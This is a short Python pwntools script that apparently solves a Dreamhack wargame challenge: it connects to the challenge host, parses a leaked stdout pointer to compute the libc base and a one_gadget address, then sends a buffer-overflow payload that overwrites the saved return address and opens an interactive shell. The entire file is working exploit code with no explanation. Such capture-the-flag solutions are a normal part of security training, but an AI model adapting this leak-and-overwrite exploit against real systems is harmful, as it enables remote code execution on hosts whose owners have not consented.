from pwn import *

p = remote("host1.dreamhack.games", 12974)

p.recvuntil("stdout: ")
stdout = p.recvuntil("\n")[:-1]

stdout = int(stdout, 16)

libc = stdout - 0x3c5620
og = libc + 0x45216

payload = b"A"*0x18
payload += b"\x00"*0x8
payload += b"B"*0x8
payload += p64(og)

p.recvuntil("MSG: ")

p.send(payload)
p.interactive()
